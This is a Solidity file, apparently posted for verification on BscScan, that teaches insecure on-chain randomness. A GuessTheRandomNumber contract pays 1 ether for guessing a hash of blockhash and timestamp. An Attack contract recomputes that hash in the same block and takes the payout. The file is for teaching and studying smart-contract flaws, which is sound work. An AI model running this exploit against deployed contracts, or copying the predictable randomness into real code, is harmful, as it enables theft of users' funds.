/**
 *Submitted for verification at BscScan.com on 2021-07-13
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 0    Bnb
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Bnb

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
         uint answer = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1),
            block.timestamp
        )));

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}